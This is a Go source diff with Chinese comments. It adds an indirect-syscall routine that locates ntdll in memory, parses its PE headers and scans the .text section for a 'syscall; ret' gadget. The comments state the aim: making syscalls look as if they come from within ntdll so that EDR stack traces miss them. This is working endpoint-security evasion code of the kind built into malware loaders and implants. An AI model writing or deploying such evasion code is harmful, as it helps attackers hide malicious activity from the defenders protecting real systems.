@@ -207,3 +207,71 @@ func GetSSN(name string) uint32 {
 	}
 	return 0
 }
+
+// ntdllGadget 存储ntdll.dll中 syscall; ret 指令对的地址
+// 间接syscall时，汇编stub通过CALL跳转到此地址执行syscall
+// 使EDR栈回溯看到的syscall调用点在ntdll地址空间内
+var ntdllGadget uintptr
+
+// findSyscallRetGadget 在ntdll的.text段中搜索 syscall; ret (0x0F 0x05 0xC3) 指令对
+// 返回找到的第一个gadget地址，失败返回0（回退到直接syscall）
+func findSyscallRetGadget(base uintptr) uintptr {
+	if base == 0 {
+		return 0
+	}
+
+	// MZ签名
+	if *(*uint16)(unsafe.Pointer(base)) != 0x5A4D {
+		return 0
+	}
+
+	eLfanew := *(*uint32)(unsafe.Pointer(base + 0x3C))
+	ntHeader := base + uintptr(eLfanew)
+
+	// PE签名
+	if *(*uint32)(unsafe.Pointer(ntHeader)) != 0x4550 {
+		return 0
+	}
+
+	// PE32+ OptionalHeader: FileHeader(20) + OptionalHeader
+	// NumberOfSections 在 FileHeader+2 (WORD)
+	numSections := *(*uint16)(unsafe.Pointer(ntHeader + 4 + 2))
+
+	// SizeOfOptionalHeader 在 FileHeader+16 (WORD)
+	sizeOfOpt := *(*uint16)(unsafe.Pointer(ntHeader + 4 + 16))
+
+	// 第一个SectionHeader在 OptionalHeader 之后
+	// ntHeader = PE签名(4) + FileHeader(20) + OptionalHeader(sizeOfOpt)
+	sectionBase := ntHeader + 4 + 20 + uintptr(sizeOfOpt)
+
+	for i := uint16(0); i < numSections; i++ {
+		sec := sectionBase + uintptr(i)*40 // IMAGE_SECTION_HEADER = 40 bytes
+
+		// 检查段名是否为 .text (0x747865742E = ".text" 小端后6字节)
+		namePtr := (*[8]byte)(unsafe.Pointer(sec))
+		if namePtr[0] == '.' && namePtr[1] == 't' && namePtr[2] == 'e' && namePtr[3] == 'x' && namePtr[4] == 't' {
+			// VirtualAddress(sec+12) DWORD, VirtualSize(sec+8) DWORD
+			va := *(*uint32)(unsafe.Pointer(sec + 12))
+			vs := *(*uint32)(unsafe.Pointer(sec + 8))
+			start := base + uintptr(va)
+			end := start + uintptr(vs)
+
+			// 扫描 syscall; ret: 0x0F 0x05 0xC3
+			for addr := start; addr < end-2; addr++ {
+				b := (*[3]byte)(unsafe.Pointer(addr))
+				if b[0] == 0x0F && b[1] == 0x05 && b[2] == 0xC3 {
+					return addr
+				}
+			}
+			return 0
+		}
+	}
+	return 0
+}
+
+// InitIndirectSyscall 初始化间接syscall所需gadget地址
+// 在main.go启动时调用，必须在InitSSNMap之后
+func InitIndirectSyscall() {
+	base := getNtdllBaseFromPEB()
+	ntdllGadget = findSyscallRetGadget(base)
+}
